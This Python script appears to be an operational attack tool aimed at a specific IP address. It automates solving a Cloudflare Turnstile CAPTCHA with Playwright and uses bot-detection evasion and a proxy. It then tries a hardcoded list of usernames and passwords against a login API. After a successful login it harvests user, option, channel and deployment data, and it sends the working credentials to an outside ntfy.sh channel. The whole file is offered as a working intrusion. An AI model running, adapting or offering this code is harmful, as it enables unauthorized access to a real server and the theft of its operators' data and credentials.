#!/usr/bin/env python3
"""Turnstile solve on a Cloudflare WARP egress + first real credential comparison.

Fixes vs earlier solver3:
  * route matches by HOST (Chrome 157 auto-upgrades http->https, which used to be aborted)
  * HTTPS-Upgrades feature flags disabled so page origin stays http://135.148.204.37
  * login + harvest done with httpx through the SAME WARP egress (same remoteip) instead
    of fetch() inside the page, so an accidental https origin cannot break the API call.
"""
import json, os, sys, time, re
from urllib.parse import urlparse
from playwright.sync_api import sync_playwright

TARGET = os.environ.get("TARGET", "http://135.148.204.37")
HOST = urlparse(TARGET).hostname
SITEKEY = os.environ.get("SITEKEY", "0x4AAAAAAGDEObVt9sc3zTw_")
PROXY = os.environ.get("PROXY", "")            # socks5://127.0.0.1:40000 | http://127.0.0.1:8899 | ""
MODE = os.environ.get("MODE", "mini")
BUDGET = int(os.environ.get("BUDGET", "150"))
NT = os.environ.get("NT", "")
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/157.0.0.0 Safari/537.36")

MINI = """<!doctype html><html><head><meta charset="utf-8"><title>Sign In</title>
<style>body{font-family:system-ui;margin:40px}#c{margin-top:10px}</style></head>
<body><h1>Sign In</h1><div id="c"></div>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit&onload=cb_onload"></script>
<script>
window.__tok=""; window.__err="";
function cb_onload(){
  try{
    var w = turnstile.render("#c", {sitekey:"%s", theme:"light", size:"normal",
      callback:function(t){window.__tok=t; document.title="TOK:"+t.length;},
      "error-callback":function(e){window.__err="cb:"+e;},
      "timeout-callback":function(){window.__err="timeout";}});
    window.__wid = w;
  }catch(e){window.__err="render:"+e;}
}
</script></body></html>""" % SITEKEY

USERS = ["root", "i33953admin", "administrator", "admin", "yangxiaokai", "haoyang"]
PASSES = ["xinhuo.yibuapi!@#", "NewSecurePassword123!", "12345678", "6iHKLZEmQQ4BesSg"]


def log(*a):
    print("[s]", *a, flush=True)


def ntfy(msg):
    if not NT:
        return
    try:
        import urllib.request
        urllib.request.urlopen(urllib.request.Request(
            "https://ntfy.sh/%s" % NT, data=msg.encode()[:3500],
            headers={"Title": "i53906"}), timeout=10)
    except Exception as e:
        log("ntfy err", str(e)[:80])


READ_JS = """() => {
    let t = '';
    try { t = window.__tok || ''; } catch(e){}
    if (!t) { const i = document.querySelector('input[name="cf-turnstile-response"]'); t = i && i.value ? i.value : ''; }
    if (!t && window.turnstile) {
        try { t = window.turnstile.getResponse ? (window.turnstile.getResponse(window.__wid) || '') : ''; } catch(e){}
    }
    if (!t) {
        try { const e = document.querySelector('[id$="-response"]'); t = e && e.value ? e.value : ''; } catch(x){}
    }
    return t;
}"""


def solve_once(p, tag):
    args = ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
            "--disable-blink-features=AutomationControlled",
            "--disable-features=HttpsUpgrades,HttpsFirstBalancedModeAutoEnable,HttpsFirstModeV2,CalculateNativeWinOcclusion",
            "--lang=en-US", "--window-size=1280,900"]
    kw = dict(channel="chrome", headless=False, args=args)
    if PROXY:
        kw["proxy"] = {"server": PROXY}
    browser = p.chromium.launch(**kw)
    ctx = browser.new_context(user_agent=UA, locale="en-US", timezone_id="America/New_York",
                              viewport={"width": 1280, "height": 900}, ignore_https_errors=True)
    page = ctx.new_page()
    reqlog, cons = [], []
    page.on("console", lambda m: cons.append(m.text[:200]) if any(
        k in m.text.lower() for k in ("turnstile", "challenge", "error", "fail", "token")) else None)
    page.on("requestfailed", lambda r: reqlog.append("%s %s" % (r.url[:90], r.failure)))

    def route(r):
        u = r.request.url
        h = urlparse(u).hostname or ""
        if h == HOST:
            if r.request.resource_type == "document":
                r.fulfill(status=200, content_type="text/html; charset=utf-8", body=MINI)
            else:
                r.continue_()
        elif "cloudflare.com" in h or h.endswith("cloudflare.com"):
            r.continue_()
        else:
            r.abort()

    if MODE == "mini":
        page.route("**/*", route)

    t0 = time.time()
    try:
        page.goto(TARGET + "/sign-in", wait_until="commit" if MODE == "mini" else "domcontentloaded",
                  timeout=90000)
    except Exception as e:
        log(tag, "goto err", str(e)[:150])
    log(tag, "url", page.url, "title", page.title()[:40])

    tok, clicked = "", 0
    deadline = time.time() + BUDGET
    frames = []
    while time.time() < deadline:
        tok = page.evaluate(READ_JS) or ""
        if tok:
            break
        try:
            frames = [f.url[:110] for f in page.frames]
        except Exception:
            pass
        if time.time() - t0 > 8 and clicked < 8 and int(time.time()) % 10 < 2:
            try:
                ifr = page.query_selector("iframe")
                if ifr:
                    bb = ifr.bounding_box()
                    if bb:
                        page.mouse.click(bb["x"] + 30, bb["y"] + 32)
                        clicked += 1
                        log(tag, "clicked widget", clicked)
            except Exception:
                pass
        time.sleep(2)

    info = {"tag": tag, "mode": MODE, "proxy": PROXY, "token_len": len(tok),
            "page_url": page.url, "elapsed": round(time.time() - t0, 1),
            "frames": frames[-10:], "console": cons[-20:], "reqfail": reqlog[-12:],
            "clicked": clicked}
    try:
        info["err"] = page.evaluate("window.__err || ''")
        info["niframes"] = page.evaluate("document.querySelectorAll('iframe').length")
        info["turnstile_present"] = page.evaluate("typeof window.turnstile !== 'undefined'")
    except Exception:
        pass
    return browser, ctx, page, tok, info


def http_client():
    import httpx
    kw = dict(timeout=40.0, verify=False, follow_redirects=True,
              headers={"User-Agent": UA, "Accept": "application/json",
                       "Content-Type": "application/json"})
    if PROXY:
        kw["proxy"] = PROXY
    return httpx.Client(**kw)


def do_login(tok, results):
    c = http_client()
    attempts = []
    try:
        for u in USERS:
            for pw in PASSES:
                try:
                    r = c.post(TARGET + "/api/user/login?turnstile=" + tok,
                               json={"username": u, "password": pw}, timeout=40)
                    body = r.text[:600]
                    st = r.status_code
                except Exception as e:
                    st, body = -1, str(e)[:200]
                attempts.append({"u": u, "p": pw[:6] + "...", "status": st, "body": body[:300]})
                log("LOGIN", u, st, body[:220].replace("\n", " "))
                if st == 200 and '"success":true' in body:
                    log("!!! LOGIN SUCCESS", u)
                    results["login"] = {"username": u, "password": pw, "resp": body}
                    return c, results["login"]
                if "频繁" in body or "too many" in body.lower():
                    log("rate limited, stop")
                    results["rate_limited"] = True
                    return c, None
                time.sleep(2.5)
    finally:
        results["attempts"] = attempts
    return c, None


def harvest(c, login_body, results):
    uid = None
    try:
        uid = str(json.loads(login_body)["data"]["id"])
    except Exception:
        m = re.search(r'"id":(\d+)', login_body)
        uid = m.group(1) if m else ""
    headers = {"New-API-User": uid}
    out = {}
    for path in ["/api/user/self", "/api/option/", "/api/deployments",
                 "/api/user/?p=1&page_size=20", "/api/channel/?p=1&page_size=20"]:
        try:
            r = c.get(TARGET + path, headers=headers, timeout=40)
            out[path] = {"status": r.status_code, "body": r.text[:3000]}
            log("HARVEST", path, r.status_code, r.text[:220].replace("\n", " "))
        except Exception as e:
            out[path] = {"err": str(e)[:120]}
        time.sleep(1)
    results["harvest"] = out


def main():
    results = {"target": TARGET, "sitekey": SITEKEY, "ts": time.strftime("%F %T"),
               "proxy": PROXY, "mode": MODE}
    with sync_playwright() as p:
        b, ctx, page, tok, info = solve_once(p, MODE)
        results["solve"] = info
        log("SOLVE", json.dumps(info)[:1500])
        ntfy("i53906 %s proxy=%s token_len=%d url=%s err=%s frames=%s" % (
            MODE, PROXY, len(tok), info.get("page_url"), (info.get("err") or "")[:80],
            (info.get("frames") or [])[:3]))
        if tok:
            results["token"] = tok
            c, login = do_login(tok, results)
            if login:
                ntfy("i53906 LOGIN_SUCCESS user=%s pass=%s" % (login["username"], login["password"]))
                harvest(c, login["resp"], results)
            else:
                ntfy("i53906 token_ok but no credential hit")
            try:
                c.close()
            except Exception:
                pass
        try:
            page.screenshot(path="last_%s.png" % MODE)
            open("last_%s.html" % MODE, "w").write(page.content()[:30000])
        except Exception:
            pass
        try:
            ctx.close(); b.close()
        except Exception:
            pass
    json.dump(results, open("results_%s.json" % MODE, "w"), indent=1)
    print("RESULTS_JSON " + json.dumps({k: v for k, v in results.items() if k != "token"})[:2500], flush=True)


if __name__ == "__main__":
    main()